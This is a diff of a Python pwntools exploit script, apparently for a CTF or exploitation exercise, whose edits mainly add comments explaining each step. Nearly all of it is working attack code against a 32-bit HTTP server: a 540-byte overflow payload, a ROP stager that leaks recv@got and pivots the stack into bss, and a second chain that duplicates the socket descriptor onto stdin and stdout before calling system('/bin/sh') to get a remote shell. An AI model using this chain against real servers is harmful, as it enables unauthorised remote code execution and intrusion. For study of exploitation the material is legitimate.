@@ -18,25 +18,22 @@ pop_ebp = 0x08048f18
 leave_ret = 0x08048aec
 popret = 0x080486b1
 pop2ret = 0x08048f17
-pop4ret = 0x080491cc
 
 stager  = ''
-stager += p32(b.symbols['send_string'])
-stager += p32(pop2ret)
-stager += p32(0x4)
-stager += p32(b.got['recv'])
-stager += p32(b.symbols['recv_line'])
-stager += p32(pop2ret)
-stager += p32(0x4)
-stager += p32(bss)
-stager += p32(pop_ebp)
-stager += p32(bss)
-stager += p32(leave_ret)
+stager += p32(b.symbols['send_string'])  # |
+stager += p32(pop2ret)                   # |
+stager += p32(0x4)                       # |
+stager += p32(b.got['recv'])             #  -> Leak recv@got using send_string
+stager += p32(b.symbols['recv_line'])    # |
+stager += p32(pop2ret)                   # |
+stager += p32(0x4)                       # |
+stager += p32(bss)                       #  -> Read from stdin in bss using recv_line
+stager += p32(pop_ebp)                   # |
+stager += p32(bss)                       # |
+stager += p32(leave_ret) 		 #  -> stack shifting 
 
 payload  = ''
-payload += 'GET '
-payload += '/index.html'
-payload += ' HTTP/1.1'
+payload += 'GET /index.html HTTP/1.1'
 payload += 'A' * (540 - len(payload))
 payload += stager
 payload += '\r\n\r\n'
@@ -53,17 +50,17 @@ log.info('Libc: {:#x}'.format(base_libc))
 
 rop_chain  = ''
 rop_chain += 'C' * 3
-rop_chain += p32(base_libc + l.symbols['dup2'])
-rop_chain += p32(pop2ret)
-rop_chain += p32(0x4)
-rop_chain += p32(0x0)
-rop_chain += p32(base_libc + l.symbols['dup2'])
-rop_chain += p32(pop2ret)
-rop_chain += p32(0x4)
-rop_chain += p32(0x1)
-rop_chain += p32(base_libc + l.symbols['system'])
-rop_chain += p32(base_libc + l.symbols['exit'])
-rop_chain += p32(base_libc + 0x15cd48)
+rop_chain += p32(base_libc + l.symbols['dup2'])   # |
+rop_chain += p32(pop2ret)                         # |
+rop_chain += p32(0x4)                             # |
+rop_chain += p32(0x0)                             #  -> Redirect stdin from socket's descriptor
+rop_chain += p32(base_libc + l.symbols['dup2'])   # |
+rop_chain += p32(pop2ret)                         # |
+rop_chain += p32(0x4)                             # |
+rop_chain += p32(0x1)                             #  -> Redirect stdout from socket's descriptor
+rop_chain += p32(base_libc + l.symbols['system']) # |
+rop_chain += p32(base_libc + l.symbols['exit'])   # |
+rop_chain += p32(base_libc + 0x15cd48)            #  -> Execute /bin/sh
 rop_chain += '\r\n\r\n'
 
 sleep(1)
